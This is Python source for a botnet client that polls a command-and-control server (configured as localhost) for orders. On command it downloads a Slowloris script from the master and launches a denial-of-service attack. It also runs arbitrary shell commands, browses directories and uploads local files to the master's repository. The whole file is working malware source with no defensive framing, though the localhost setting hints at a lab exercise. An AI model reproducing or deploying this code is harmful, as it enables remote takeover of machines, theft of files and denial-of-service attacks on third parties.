# from flask import Flask
from subprocess import Popen, PIPE
import subprocess
import requests
import time
import shutil
import inspect
import os
import json

MASTER_IP = "localhost"
MASTER_PORT = "5000"
SERVING_PORT = "8989"

result = ""


def get_command():
    command = requests.get("http://" + MASTER_IP + ":" + MASTER_PORT + "/get_command").json()
    return command

def parse_ret_val(ret_val):
    cmd = ret_val['command']
    extra = ret_val['extra']
    return (cmd, extra)

def get_script():
    while 1:
        try:
            r = requests.get("http://" + MASTER_IP + ":" + MASTER_PORT + "/get_script", stream=True)
            with open('slowloris.py', 'wb') as out_file:
                shutil.copyfileobj(r.raw, out_file)
            return
        except Exception:
            print("Error getting script from master")
            continue
def launchDDoS():
    proc = Popen("python slowloris.py -i " + MASTER_IP +  " -p " + SERVING_PORT + " -s 30", \
        shell=True, stdin=PIPE, stdout=PIPE \
        , stderr=PIPE)
    out, err = proc.communicate()
    print(out, err)

def ls(path):
    global result
    result = [file for file in os.listdir(path)]
    
def pwd():
    global result
    result = os.getcwd()

def cd(path):
    global result
    os.chdir(path)
    result = os.getcwd()

def send_result():
    global result
    print("In result")
    while 1:
        try:
            requests.post("http://" + MASTER_IP + ":" + MASTER_PORT + "/result", json=json.dumps(result))
            return
        except Exception as e:
            print(e)

def upload_file(file_name):
    global result
    files = [file for file in os.listdir()]
    if file_name not in files:
        result = "File does not exist"
        send_result()
    else:
        url = "http://" + MASTER_IP + ":" + MASTER_PORT + "/repository"
        fin = open(file_name, 'rb')
        files = {'file': fin}
        try:
            r = requests.post(url, files=files)
            print (r.text)
        finally:
            fin.close()

def runcmd(cmd):
    global result
    """ Chạy một shell command và trả về output"""
    try:
        print("In run cmd")
        proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = proc.communicate()
        result = str(out + err)
        print(result)
    except Exception as exc:
        print("In exceptio")
        print(str(exc))
        result = str(exc)

def Standby(hours):
    seconds = float(float(hours) * 3600)
    time.sleep(seconds)

steps = {
    "DDoS": (get_script, launchDDoS),
    "Standby": (Standby, ),
    "ls" : (ls, send_result),
    "cd" : (cd, send_result),
    "pwd" : (pwd, send_result),
    "upload" : (upload_file, ),
    "runcmd" : (runcmd, send_result)
}


def run():
    while True:
        try:
            command  =  get_command()
            command = parse_ret_val(command)
            if str(command[0]) not in steps:
                continue
            else:
                print("command is:", command[0])
                print(command[1])
                print(steps[command[0]])
                for step in steps[command[0]]:
                    args = inspect.getargspec(step)[0]
                    assert(isinstance(args, list))
                    if 'path' in args or 'file_name' in args or 'cmd' in args or 'hours' in args:
                        step(command[1])
                    else:
                        step()
        except Exception as e:
            pass
        time.sleep(5)
if __name__ == "__main__":
    run()
